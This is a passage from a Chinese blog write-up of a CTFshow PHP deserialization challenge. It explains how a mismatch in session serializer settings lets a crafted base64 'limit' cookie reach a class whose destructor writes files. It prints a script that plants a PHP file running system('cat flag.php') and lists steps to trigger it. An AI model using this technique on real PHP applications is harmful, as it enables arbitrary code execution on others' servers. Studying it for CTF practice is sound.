		<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limti'</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token number">5</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"登陆失败次数超过限制"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
		 <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"limit"</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		 <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>	
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>注意这里设置 cookie 的时候没有设置 seesion 序列化选择器的，就是 php.ini 中配置的序列化选择器</p> 
<p>回顾下三种选择器</p> 
<table><thead><tr><th align="left"><strong>选择器</strong></th><th align="left"><strong>存储格式</strong></th><th align="left"><strong>样例 $_SESSION[‘name’] = ‘ocean’;</strong></th></tr></thead><tbody><tr><td align="left">php_serialize</td><td align="left">经过 serialize() 函数序列化数组</td><td align="left">a:1:{s:4:“name”;s:5:“ocean”;}</td></tr><tr><td align="left">php（默认）</td><td align="left">键名 竖线 经过 serialize() 函数处理的值</td><td align="left">name|s:5:“ocean”;</td></tr><tr><td align="left">php_binary</td><td align="left">键名的长度对应的ascii字符 键名 serialize() 函数序列化的值</td><td align="left"> name s:6:“spoock”;</td></tr></tbody></table> 
<p><img src="https://images2.imgbox.com/d2/b2/OmW0nWYT_o.png" alt="image-20210921152024591"></p> 
<p>然后 inc.php 中却单独声明使用了 php 序列化选择器，应该出题人改了默认的选择器，不然这里就不会单独声明了，还有一点就是，第六行的 session_start() 函数会解析 session 文件，就相当于进行了反序列化</p> 
<pre><code class="prism language-php"><span class="token comment"># inc.php</span>
<span class="token operator">...</span><span class="token operator">...</span>
<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">status</span><span class="token operator">=</span><span class="token variable">$s</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"log-"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"使用"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">password</span><span class="token operator">.</span><span class="token string double-quoted-string">"登陆"</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">status</span><span class="token operator">?</span><span class="token string double-quoted-string">"成功"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"失败"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"----"</span><span class="token operator">.</span><span class="token function">date_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">...</span><span class="token operator">...</span>
</code></pre> 
<p>User 类中的 file_put_contents 像是一个利用点，</p> 
<p>访问首页，抓包可以看到 Cookie:limit 参数，可以把反序列化数据写入 session 文件</p> 
<p>因 inc/inc.php 存在 ini_set(‘session.serialize_handler’, ‘php’); 和 session_start(); ，只要访问即会获取之前写入的 session 数据，然后 check.php 包含 inc/inc.php ，即会触发 User类 的 __destruct方法 ，从而把恶意数据通过 file_put_contents 写入名为 log-$this.username ，内容为 $this.password 的文件</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'test.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php system("cat flag.php") ?&gt;'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<blockquote> 
 <p>加 <code>'|'</code> 是因为 <code>session.serialize_handler</code> 使用 <code>php引擎</code> ，session 关联数组的 <code>key</code> 和 <code>value</code> 是通过 <code>'|'</code> 区分的， <code>value</code> 是需要被反序列化的部分。然后默认不是用 php 引擎，所以写入是正常字符串，在 <code>inc/inc.php</code> 这读取语义又不一样了</p> 
</blockquote> 
<p>具体步骤就是：</p> 
<ol><li> <p>生成 base64 编码序列化字符串</p> </li><li> <p>将字符串在浏览器中保存为cookie（输入cookie，刷新下页面），或者抓包改 cookie:limit 的值</p> <p><img src="https://images2.imgbox.com/69/ea/xJ5B8frj_o.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Er3JSYow-1632285285348)(F:%5C_%E7%AC%94%E8%AE%B0%5Cmdpic%5C8.CTFshow%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-WEB-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_pic%5Cimage-20210921155030824.png)]"></p> </li><li> <p>请求 check.php 反序列化，生成文件</p> </li><li> <p>访问生成的文件，得到flag</p> <p><img src="https://images2.imgbox.com/16/b8/Tb4j8tfI_o.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EEMGw5jq-1632285285350)(F:%5C_%E7%AC%94%E8%AE%B0%5Cmdpic%5C8.CTFshow%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-WEB-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_pic%5Cimage-20210921160026647.png)]"></p> </li></ol> 
<h4><a id="_695"></a>参考链接</h4> 
<p>https://blog.csdn.net/miuzzx/article/details/110558192</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/3eb243f18ac425d493da96ccba9bf5e2/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">【优化求解】基于粒子群算法求解多目标优化问题matlab源码</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/f74a250e1b3cc6db15767a62724dfc9c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">关于pycharm中Debugger失败的问题，报错：Connection to Python debugger failed Interrupted function call: accept fa</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>